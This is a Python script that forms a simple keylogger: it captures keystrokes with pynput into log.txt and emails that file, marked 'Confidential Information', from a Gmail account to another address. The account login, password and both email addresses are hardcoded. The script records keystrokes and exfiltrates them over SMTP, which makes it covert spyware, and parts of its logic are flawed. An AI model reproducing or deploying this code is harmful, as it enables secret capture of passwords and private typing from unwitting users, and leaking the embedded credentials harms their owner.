from typing import TextIO
import smtplib

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

port = 2525
smtp_server = "smtp.gmail.com"
login = "It20021634@#"
password = "It20021634@#"

subject = "Monitoring Report"
sender_email = 'ysudhara99@gmail.com'
receiver_email = 'yasindusudhara7@gmail.com'

message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject

body = "*Confidential Information*"
message.attach(MIMEText(body, "plain"))

filename = "log.txt"

attachment = open(filename, "rb")

part = MIMEBase("application", "octet_stream")
part.set_payload(attachment.read())

encoders.encode_base64(part)

part.add_header(
    "content-Disposition",
    f"attachment; filename = {filename}",
)

message.attach(part)
text = message.as_string()

with smtplib.SMTP("smtp.gmail.com", 2525) as server:
    server.login(login, password)
    server.sendmail(
        sender_email, receiver_email, text
    )
print("send the email")

# from email.mime.multipart import MIMEMultipart
# from email.mime.txt import MIMEText
from pynput.keyboard import Listener, Key

count = 0
keys = []

f = open('log.txt', 'r+')
f.truncate(0)


def write_file(keys):
    # with open('log.txt', 'r') as t,\
    with open('log.txt', 'a') as g:
        for key in keys:
            # k = t.read()
            # k = k.replace("'", "")
            k = str(keys).replace("'", "")
            if k.find("space") > 0:
                g.write("_")
            elif k.find("key") == -1:
                g.write(k)


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed", format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys.clear()


def on_release(key):
    if key == Key.esc:
        return


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
